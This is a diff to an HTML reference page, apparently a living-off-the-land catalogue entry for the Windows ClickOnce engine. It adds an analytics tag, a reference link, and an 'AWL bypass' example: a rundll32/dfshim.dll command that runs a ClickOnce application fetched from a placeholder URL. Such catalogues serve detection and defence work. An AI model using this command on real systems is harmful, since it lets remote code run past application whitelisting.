@@ -41,6 +41,14 @@
 <p>ClickOnce engine in Windows used by .NET</p>
 
 
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133649096-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-133649096-1');
+</script>
 
 <br>
 <p><b>Paths:</b> 
@@ -61,6 +69,9 @@
 <br>
 	
 	<a href="https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf">https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf</a>
+	<br>
+	
+	<a href="https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe">https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe</a>
 	<br>
 	 
 <br>
@@ -87,9 +98,9 @@
 	
 <h2 id="awl bypass" class ="function-name">AWL bypass</h2>
 	
-		Missing example
+		Executes click-once-application from Url
 		<br>
-		<pre><code>Missing Example</code></pre>
+		<pre><code>rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo</code></pre>
 		Usecase:Use binary to bypass Application whitelisting
 		<br>
 		Privileges required:User
